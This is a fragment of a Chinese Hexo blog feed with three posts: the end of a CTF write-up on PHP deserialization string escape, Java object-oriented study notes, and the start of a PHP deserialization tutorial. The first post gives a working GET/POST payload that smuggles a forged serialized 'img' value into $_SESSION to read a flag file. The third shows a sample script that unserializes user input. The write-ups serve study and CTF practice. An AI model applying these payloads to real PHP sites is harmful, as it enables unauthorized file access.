punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>假设有一个过滤机制将flag都换为空则结果变为了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果，这时候进行反序列化会怎么样。我们聚焦于s:24，程序会读取长度为24的字符串。于是，读取了 <strong>“;s:8:”function”;s:59:”a</strong>，读取这24个字符后以”;结尾，正好符合了字符读取的规则。</p><p>接下来img，读取ZDBnM19mMWFnLnBocA==，dd读取a。然后，便遇到了;}，从上面的特点1我们完全可以看出，反序列读取应当以这个作为结束。所以后买呢的img没有被读取，我们的img发生了变化，经过反序列化变为了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"a"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写为数组，即为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:8:"function";s:59:"a'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现，SESSION数组的键值img对应的值发生了改变。</p><p>设想，如果我们可以控制function，但是没有办法控制img，我们便可以利用replace，将function中的img前移替代真正的img。同时因为;}存在，使反序列化时，我们的程序不在乎后面的语句，以达到间接控制img的值。</p><h3 id="payload的构造-1"><a href="#payload的构造-1" class="headerlink" title="payload的构造"></a>payload的构造</h3><p>如果要进行反序列化，funcation，即f必须为show_image。然后，反序列化显示session[img]部分可由post方式进行上传，具体的可以看代码第5步，它会覆盖程序给的值。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">GET:?f&#x3D;show_imagePOST:_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/zhengna/p/13297816.html">攻防世界-web-Web_php_unserialize（PHP反序列化漏洞）</a></p><p><a href="https://blog.csdn.net/JasonAPoint/article/details/78930827">extract</a></p><p><a href="https://www.jianshu.com/p/8e8117f9fd0e">安洵杯</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象(中)</title>
      <link href="/2021/09/26/java-mian-xiang-dui-xiang-zhong/"/>
      <url>/2021/09/26/java-mian-xiang-dui-xiang-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="封装性"><a href="#封装性" class="headerlink" title="封装性"></a>封装性</h2><h3 id="为什么要有封装性"><a href="#为什么要有封装性" class="headerlink" title="为什么要有封装性"></a>为什么要有封装性</h3><p> 首先我们程序设计追求“高内聚、低耦合”</p><p>高内聚：类的内部数据操作细节自己完成，不允许外部干涉</p><p>低耦合：仅仅对外暴露少量的方法用于使用。</p><p> 简单的说</p><p>把该隐藏的隐藏起来，该暴露的暴露出来，这就是封装性的设计思想</p><h3 id="问题的引入"><a href="#问题的引入" class="headerlink" title="问题的引入"></a>问题的引入</h3><p>放我们创建一个类的对象以后，我们可以通过“对象、属性”的方式，对对象的属性进行复制。这里，复制操作要受到属性的数据类型和存储范围的制约。除此以外，没有其他制约条件。到那时，在实际问题中，我们往往需要给属性赋值加入额外的限定条件。这个条件就不能在属性声明时体现，我们只能通过方法进行限制条件的添加。</p><p>同时我们要避免用户使用“对象。属性”的方式对属性进行复制，则需要将属性设为私有</p><h3 id="封装性的体现"><a href="#封装性的体现" class="headerlink" title="封装性的体现"></a>封装性的体现</h3><p>体现一：我们将类的属性私有化(private)，同时，提供公共(public)的方法来获取和设置</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">class Animals&#123;    String name;    private int age;    private int legs;    public void  setLegs(int l)&#123;        if(l &gt;&#x3D; 0 &amp;&amp; l % 2&#x3D;&#x3D; 0)&#123;            legs &#x3D; l;        &#125;        else &#123;            legs&#x3D;0;        &#125;    &#125;    public void eat()&#123;        System.out.println(&quot;eat&quot;);    &#125;    public void show()&#123;        System.out.println(&quot;name &#x3D; &quot; + name + &quot;, age &#x3D; &quot; + age + &quot;, legs &#x3D; &quot; + legs);    &#125;    &#x2F;&#x2F; age的get和set方法    public int getAge()&#123;        return age;    &#125;    public void setAge(int a)&#123;        age &#x3D; a;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>体现二：不对外暴露的方法</p><p>体现三：单例模式（将构造器私有化）</p><p>体现四：如果不希望类在保外被调用，可以将类设置为default</p><h3 id="Java的四种权限"><a href="#Java的四种权限" class="headerlink" title="Java的四种权限"></a>Java的四种权限</h3><h4 id="从小到达的顺序为"><a href="#从小到达的顺序为" class="headerlink" title="从小到达的顺序为"></a>从小到达的顺序为</h4><p>private –&gt; default –&gt; protected –&gt; public</p><h4 id="具体的修饰范围"><a href="#具体的修饰范围" class="headerlink" title="具体的修饰范围"></a>具体的修饰范围</h4><p>private 类内部</p><p>default 包内部</p><p>protected 不同包的子类</p><p>public 同一项目內</p><h4 id="权限修饰符可以修饰的结构说明"><a href="#权限修饰符可以修饰的结构说明" class="headerlink" title="权限修饰符可以修饰的结构说明"></a>权限修饰符可以修饰的结构说明</h4><p>1.Java规定4种权限（从小到大）：private default,protected,public</p><p>2.4种权限可以用来修饰类以及类中的内部结构、属性、方法、构造体、内部类</p><p>3.具体的，4中权限都可以用来修饰类的内部结构：属性、方法、构造器、内部类；</p><p>修饰类只能使用default和public</p><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li><p>创建对象</p></li><li><p>初始化属性</p></li></ol><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>1.如果没有显示的定义类的构造器的话，则系统默认提供一个空参的构造器</p><p>2.定义构造器的格式”权限修饰符 类名（形参列表）{}，如果没有设置权限，那么他的权限跟随类的权限。</p><p>3.一个类中定义的多个构造其，彼此构成重构</p><p>4.一旦我们显示的定义了类的构造其以后，系统就不在提供默认的空参构造器</p><p>5.一个类中，至少有一个构造器</p><h3 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h3><p>Javabean是一种用java语言习而成的可重用组件</p><p>所谓javabean是符合如下标准的java类<br>（1）类是公共的<br>（2）有一个无参的公共构造器<br>（3）有属性，且有的get、set方法</p><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ol><li><p>可以调用的结构：属性、方法：构造器</p></li><li><p>this调用属性、方法</p></li></ol><p>this理解为：当前对象（属性、方法）或 当前证件建立的对象（构造器）</p><p>2.1 在类的方法和构造器中，我们可以使用this.属性或者this.方法的方式，调用当前对象的属性或方法。但是，通常情况下，我们都选择省略this。特殊情况下，如果方法的形参和类的属性同名，我们必须显示的使用this.变量，表明变量是属性而非形参。</p><p>2.2 在类的构造其中，我们可以使用this.属性或者this.方法的方式，调用当前正在创建的对象属性或者方法，但是，通常情况下，我们选择省略this.。特殊情况下，如果构造器的形参与类的属性同名时，我们必须现实的使用“this.变量”de fangshi ,表明此变量是属性，而非形参。</p><ol start="3"><li>this调用构造器</li></ol><p>（1）我们在类的构造器中，可以显示的使用“this（形参列表）”方式，调用本类中指定的其他构造器</p><p>（2）构造器不能通过“this（形参列表）”的方式调用自己</p><p>（3）构造器的调用必须放到首行</p><p>（4）不能在一个构造器中调用多个构造器</p><h2 id="import-和-package"><a href="#import-和-package" class="headerlink" title="import 和 package"></a>import 和 package</h2><h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><h4 id="MVC设计模式"><a href="#MVC设计模式" class="headerlink" title="MVC设计模式"></a>MVC设计模式</h4><p><img src="mvc.png"></p><h4 id="JDK常用的包"><a href="#JDK常用的包" class="headerlink" title="JDK常用的包"></a>JDK常用的包</h4><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>import:导入</p><ol><li><p>在源文件中现实的使用import结构导入指定包下的类、接口</p></li><li><p>声明在包的声明和类的声明之间</p></li><li><p>如果需要导入多个结构，则并列的写入即可</p></li><li><p>使用“xxx.”的方式，表示可以导入xxx包下的所有结构</p></li><li><p>如果使用的类或接口是本包下定义的可以省略import</p></li><li><p>如果使用的类或者接口是java.lang下定义的，可以省略import结构</p></li><li><p>如果在源文件中，使用不同包下的同名的类，则必须至少有一个类需要一全类名的方式下面是</p></li><li><p>“xxx.”仅代表类等，不代表结构，如果是结构下的类，仍然需要写明</p></li></ol><h2 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h2><h3 id="为什么要有类的继承性"><a href="#为什么要有类的继承性" class="headerlink" title="为什么要有类的继承性"></a>为什么要有类的继承性</h3><ol><li>减少了冗余，提高了代码的复用程度</li><li>便于功能的拓展</li><li>为之后多态的使用提供了前提</li></ol><p><img src="extend.png"></p><h3 id="继承性的格式"><a href="#继承性的格式" class="headerlink" title="继承性的格式"></a>继承性的格式</h3><p>class A extend B{}<br>   A：子类、派生类、subclass。<br>   B：父类、超类、基类、superclass</p><h3 id="子类继承父类以后有什么不同？"><a href="#子类继承父类以后有什么不同？" class="headerlink" title="子类继承父类以后有什么不同？"></a>子类继承父类以后有什么不同？</h3><ol><li><p>体现：一旦子类A继承父类B以后，子类A中就获取了父类B中声明的所有结构、属性、方法。</p><p> 特别的，父类中声明为private的属性或者方法，子类继承父类以后，仍然认为获取了父类中私有结构只有因为封装性的影响，使得子类不能调用父类的结构而已</p></li><li><p>子类继承父类以后，还可以声明自己特有的属性或者方法。实现的功能拓展。</p><p>子类和父类的关系，不同于子集与集合的关系。</p></li></ol><h3 id="Java继承性的说明"><a href="#Java继承性的说明" class="headerlink" title="Java继承性的说明"></a>Java继承性的说明</h3><ol><li><p>一个类可以被多个子类继承</p></li><li><p>Java类单继承性：一个子类只能有一个父类</p></li><li><p>子父类是一个相对的概念。</p></li><li><p>子类直接继承的父类，称为直接父类。间接继承的，称为间接父类。</p></li><li><p>子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法。</p></li></ol><h3 id="Java-lang-Object类的理解"><a href="#Java-lang-Object类的理解" class="headerlink" title="Java.lang.Object类的理解"></a>Java.lang.Object类的理解</h3><ol><li><p>如果我们没有显示的声明一个类的父类的话，则此类继承与java.lang.Object类</p></li><li><p>所有的java类（除了java.lang.Object）以外都直接或简介的继承java.lang.Object类</p></li><li><p>意味着所有的java类都具有java.lang.Object类中声明的方法。</p></li></ol><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>子类继承父类以后，可以队父类中同名、同参数的方法，进行覆盖操作。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>方法的生命：权限修饰符 返回值类型 方法名（形参列表）{<br>// 方法体<br>}<br>约定俗成：子类中的叫重写方法，父类中的叫做被重写的方法。</p><p>（1）子类重写的方法的方法名和形参列表与父类被重写的方法的形参列表相同</p><p>（2）子类中重写的权限修饰符不小于父类被重写的权限修饰符</p><p>特殊情况：子类中不能重写父类中private权限的方法。</p><p>（3）返回值类型，<br>父类的返回值类型为void，则子类重写的返回值类型也只能为void</p><p>父类的返回值类型为A类，则子类重写的返回值类型可以使A类或者A类的子类</p><p>父类的返回值类型是基本数据类型(double)，则子类重写的方法的返回值类型必须是相同的基本数据类型(double)。</p><p>（4）子类重写的方法抛出的异常类型不大于父类被重写的方法抛出的异常类型。</p><p>子类和父类中同名同参数的方法要么都声明为非static的，要么都声明为static（非重写）</p><h3 id="重载与重写"><a href="#重载与重写" class="headerlink" title="重载与重写"></a>重载与重写</h3><p>两者的概念</p><p>重载，重写的具体规则</p><p>重载：不体现多态性</p><p>重写：体现多态性</p><p>重载：是指允许存在多个同名方法，而这些方法的参数不同。编译器根据方法不同的参数表，对同名方案的名称进行修饰。对于编译器而言，这些同名方法就成了不同的方法。他们的调用地址在编译期就已经绑定了。Java的重载包括父类和子类，即子类可以重载父类同名不同参数的方法。 </p><p>所以，对于重载而言，在方法在调用前，编译器就已经确认了所要调用的方法，这被称为早绑定或者金泰绑定</p><p>对于多态，只有在方法调用的那一刻，解释运行器才可以确认所要调用的具体方法，这被成为晚绑定或者动态绑定</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Circle</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">findArea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 求面积</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Cylinder</span> <span class="token keyword">extends</span> <span class="token class-name">Circl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">findArea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 求表面积</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><h3 id="可以调用的结构"><a href="#可以调用的结构" class="headerlink" title="可以调用的结构"></a>可以调用的结构</h3><p>属性、方法、构造器</p><h3 id="super调用属性、方法"><a href="#super调用属性、方法" class="headerlink" title="super调用属性、方法"></a>super调用属性、方法</h3><ol><li><p>我们可以再子类的方法或者构造器中，通过使用super.id或者super.方法的方式，显示的调用父类中声明的属性或方法，但是，通常情况下，我们习惯省略super</p></li><li><p>特殊情况，当父类和子类中定义了同名的属性，我们想要在子类中调用父类中声明的属性，则必须显示的使用super。属性的方式，表明调用的是父类中声明的属性</p></li><li><p>方法：当子类重写了父类中的方法后，我们想要在子类的方法中调用父类被重写的方法时，则必须显示的使用“super。方法”，表明调用的是父类中声明的属性</p></li></ol><h3 id="super调用构造器"><a href="#super调用构造器" class="headerlink" title="super调用构造器"></a>super调用构造器</h3><ol><li><p>我们再子类的构造器汇总显示的使用”super(形参列表)”的方式，调用父类中声明的指定构造器</p></li><li><p>super（形参列表）使用，必须声明在子类构造器的首行</p></li><li><p>我们在类的构造器中，针对this形参或者super形参只能二选一</p></li><li><p>我们再构造器的首行挤没显示的声明this或者super，则默认调用的是父类中空参的的构造其，super</p></li><li><p>在类的多个构造中，至少有一个类的构造器中使用“super”，调用构造器</p></li></ol><h2 id="子类对象实例化的过程"><a href="#子类对象实例化的过程" class="headerlink" title="子类对象实例化的过程"></a>子类对象实例化的过程</h2><ol><li><p>从结果来看（继承性）：</p><p>子类继承父类以后，就获取了父类中声明的属性或方法<br>创建子类的对象，在堆空间，就会加载所有父类中声明的属性</p></li><li><p>从过程上来看</p><p>当我们通过子类的构造其创建子类对象是，我们一定会直接或简介的调用其父类的构造器，进而调用父类的父类构造器。。。直到调用了java.lang.Object中空间<br>的构造器位置。正因为加载过所有父类的结构，所以才能看到内存中有父类中的结构，子类对象才可以考虑进行调用</p><p>明确，虽然创建对象的时，调用了父类的构造器，但从始到终就创造了一个对象，即new的子对象</p></li></ol><h2 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h2><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>可以理解为一个事物的多种形态</p><h3 id="何为多态性"><a href="#何为多态性" class="headerlink" title="何为多态性"></a>何为多态性</h3><p>对象的多态性：父类的引用指向子类的对象（或者子类的对象赋给父类的引用）</p><p>Person p = new Man();<br>p1.eat();</p><h3 id="使用，虚拟方法调用"><a href="#使用，虚拟方法调用" class="headerlink" title="使用，虚拟方法调用"></a>使用，虚拟方法调用</h3><p>有了对象的多态性以后，我们在编译器，只能调用父类中声明的方法，但在运行过程中，我们实际执行的是子类重写父类的方法</p><p>总结：编译看左面，运行看右面</p><h3 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h3><p>1）类的继承（2）方法的重写</p><h3 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h3><h3 id="向上转型与向下转型"><a href="#向上转型与向下转型" class="headerlink" title="向上转型与向下转型"></a>向上转型与向下转型</h3><h4 id="为什么使用向下转型"><a href="#为什么使用向下转型" class="headerlink" title="为什么使用向下转型"></a>为什么使用向下转型</h4><p>有了对象的多态性以后，内存中实际上家在儿子类特有的属性和方法，但是由于变量声明为父类类型，导致编译时，只能调用父类中声明的属性方法。子类特有的属性方法不能调用。</p><h4 id="如何才能调用子类特有的属性和方法"><a href="#如何才能调用子类特有的属性和方法" class="headerlink" title="如何才能调用子类特有的属性和方法"></a>如何才能调用子类特有的属性和方法</h4><p>向下转型：使用强制类型转化</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>使用强转时，肯呢出现类型异常。所以，我们在转换前前使用instanceof进行判断。a instanceof A 判断独享是否时A的一个势力。如果是返回true，否则false</p><h3 id="多态性的理解"><a href="#多态性的理解" class="headerlink" title="多态性的理解"></a>多态性的理解</h3><ol><li><p>实现代码的通用性</p></li><li><p>Object类中定义的public boolen equals(Object obj){}<br> JDBC使用java程序操作数据库（Mysql，Oracle）</p></li><li><p>抽象类、接口的使用肯定体现多态性（）</p></li></ol><h2 id="封装类"><a href="#封装类" class="headerlink" title="封装类"></a>封装类</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2021/09/25/php-fan-xu-lie-hua/"/>
      <url>/2021/09/25/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p><img src="1.png"></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>了解反序列化前，我们需要先知道什么是序列化</p><blockquote><p>我们把变量从内存中变成可存储或传输的过程称之为序列化(serialization)</p></blockquote><p>将对象转化成字符串，持久保存，便于网络传输</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控的后果。在反序列化的过程中自动触发某些 魔术方法。当进行反序列化的时候就有可能触发对象中的一些魔术方法。</p><pre class="line-numbers language-none"><code class="language-none">serialize();        &#x2F;&#x2F; 将一个对象转化成字符串unserialize();      &#x2F;&#x2F; 将一个字符串转化成对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>触发：unserialize的函数变量可控，文件中存在可利用的类。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="无类"><a href="#无类" class="headerlink" title="无类"></a>无类</h3><p>即没有类的php语句。</p><h4 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h4><p>执行如下的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"violet"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为</p><blockquote><p>s:6:”violet”;</p></blockquote><p>这个是什么意思呢？</p><blockquote><p>O(代表object,I代表数组)4(对象长度):”info”(对象名称):2(该对象中变量个数):{s(变量数据类型,s代表string,i代表int):4(变量名长度):”name”(变量名);i:2:”19”}</p></blockquote><p>所以结果的意思为一个字符串类型的变量，长度为6，内容为”violet“</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>我们执行下面的代码，结果为什么呢？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s:6:"violet";'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果很明显是violet</p><h3 id="有类"><a href="#有类" class="headerlink" title="有类"></a>有类</h3><p>与无类相反，这里存在类，并且这里也是重点。</p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>在有类的反序列化中非常重要的一点是有魔术方法。这部分也是CTF经常会考察的地方。</p><p>详细的使用可以参考<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><p>下面只是粗略的列出，以便查阅。</p><pre class="line-numbers language-none"><code class="language-none">__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用。__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法，echo或者拼接字符串就会触发。__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"violet"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$KEY</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Abc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$test</span>  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> 